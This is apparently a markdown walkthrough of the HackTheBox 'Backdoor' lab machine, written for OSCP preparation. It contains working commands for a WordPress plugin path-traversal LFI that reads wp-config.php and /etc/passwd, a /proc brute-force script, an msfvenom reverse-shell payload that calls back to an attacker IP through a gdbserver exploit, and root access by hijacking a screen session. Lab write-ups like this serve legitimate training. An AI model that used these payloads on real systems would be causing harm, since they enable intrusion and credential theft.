## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)

---

## 🔍 Recon

### Nmap Scans
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.125
nmap -p 22,80,1337 -sCV -oA scans/nmap-tcpscripts 10.10.11.125
```

### Manual Checks
```bash
nc -v 10.10.11.125 1337
curl 10.10.11.125:1337
```

---

## 🌐 [Website & WordPress Recon](HTTP)

### /etc/hosts Update
```bash
echo "10.10.11.125 backdoor.htb" | sudo tee -a /etc/hosts
```

### WPScan
```bash
wpscan -e ap,t,tt,u --url http://backdoor.htb --api-token $WPSCAN_API
wpscan -e ap --plugins-detection aggressive --url http://backdoor.htb --api-token $WPSCAN_API
```

### Feroxbuster (Plugin Discovery)
```bash
feroxbuster -u http://backdoor.htb/wp-content/plugins -w plugins.txt
```

---

## 🧪 Shell as User

### Ebook Download Plugin Exploit
```bash
# Check plugin version
curl http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt

# Exploit LFI to read wp-config
curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php

# Read /etc/passwd
curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../etc/passwd
```

### Process Enumeration via /proc
```bash
curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/self/cmdline | tr '\000' ' ' | cut -c115- | rev | cut -c32- | rev
```

### Bash Script to Find gdbserver
```bash
#!/bin/bash
for i in $(seq 1 50000); do
    path="/proc/${i}/cmdline"
    skip_start=$(( 3 * ${#path} + 1))
    skip_end=32

    res=$(curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=${path}ne -o- | tr '\000' ' ')
    output=$(echo $res | cut -c ${skip_start}- | rev | cut -c ${skip_end}- | rev)
    if [[ -n "$output" ]]; then
        echo "${i}: ${output}"
    fi
done
```

---

## 🧨 Exploit gdbserver (User Shell)

### Create Reverse Shell Payload
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 PrependFork=true -f elf -o rev.elf
```

### GDB Remote Exploit
```bash
gdb -q rev.elf
(gdb) target extended-remote 10.10.11.125:1337
(gdb) remote put rev.elf /dev/shm/rev
(gdb) set remote exec-file /dev/shm/rev
(gdb) run
```

### Catch the Shell
```bash
nc -lnvp 443
```

### Upgrade the Shell
```bash
script /dev/null -c bash
# then Ctrl+Z
stty raw -echo; fg
# then type
reset
# when prompted:
screen
```

---

## 💣 Metasploit Method (Alternative)

```bash
msfconsole
use exploit/multi/gdb/gdb_server_exec
set RHOSTS 10.10.11.125
set RPORT 1337
set LHOST tun0
run
```

---

## ⚡ Shell as Root

### Spot screen Process
```bash
ps auxww | grep screen
```

### Connect to Root's Screen Session
```bash
screen -ls root/
TERM=screen screen -x root/[session_id]
# OR
TERM=screen screen -x root/root
```

---

## 🏁 Flags
```bash
cat /home/user/user.txt
cat /root/root.txt
```